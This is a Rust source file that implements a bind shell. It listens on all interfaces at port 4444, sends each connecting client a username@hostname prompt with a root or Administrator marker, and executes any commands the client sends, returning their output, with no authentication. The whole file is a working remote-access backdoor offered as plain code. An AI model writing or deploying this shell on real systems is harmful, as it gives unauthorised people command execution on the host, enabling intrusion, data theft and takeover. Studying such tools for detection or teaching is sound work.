use std::net::{TcpListener,TcpStream};
use std::io::{Read,Write};
use std::str;
use std::process::Command;
use whoami;
use std::env;
fn handle_connection(mut stream: TcpStream) {                                       // handles incoming connections     
    let mut buf = [0; 512];                                                         // allocate memory to hold shellcode
    loop {                                                                          // execute the following in a loop
        write!(stream, "{}@{}: {} \n", whoami::username(),whoami::hostname(), std::env::current_dir().unwrap().to_str().unwrap()).unwrap();         // prints shell information to client
        if whoami::username() == "root" || whoami::username() == "Administrator" {  // if root/administrator, follow shell convention: #
            write!(stream, "# ").unwrap();
        }
        else {                                                                      // if not root/administrator, follow shell convention: $
            write!(stream, "$ ").unwrap();          
        }
        let bytes_read = match stream.read(&mut buf) {                              // read bytes from client
            Ok(0) => return, 
            Ok(bytes_read) => bytes_read,
            Err(_) => return,
        };
        let cmd: Vec<&str> = str::from_utf8(&buf[..bytes_read]).unwrap().split_whitespace().collect();          // vectorize commands and arguments
        if cmd[0] == "cd" {                                                         // if the command is cd - it won't work because environment vars arent persistent. Instead, do this:
            match env::set_current_dir(cmd[1]) {                                    // set the current dir with rust api
                Ok(()) => {
                    continue;
                },
                Err(e) => {
                    write!(stream, "{e}").unwrap();
                }
            }
        }
        else {                                                                      // if the command is not cd, run it
            let output = Command::new(cmd[0])                                       // run the command with new args and store output
            .args(&cmd[1..])
            .output();
                match output {
                    Ok(output) => {
                        stream.write_all(&output.stdout[..]).unwrap();              // write output to client
                    },
                    Err(e) => {
                        write!(stream, "{} is not recognized as a command (error: {e})\n",cmd[0]).unwrap();         // send error to client
                    }
                }
        }
    }                                                                               // restart loop
}
fn main() {               

let host = String::from("0.0.0.0");                                                 // var for host address
let port = String::from("4444");                                                    // var for port number
    let addr = format!("{}:{}", host, port);                                        // concatenate -> host:port
    let listener = TcpListener::bind(addr).unwrap();                                // start listening for network connections
    for stream in listener.incoming() {                                             // for incoming connections
        match stream {
            Ok(stream) => {
                handle_connection(stream);                                          // manage connection
            }
            Err(_) => {println!("{}", "Connection failed")}
        }
    }
}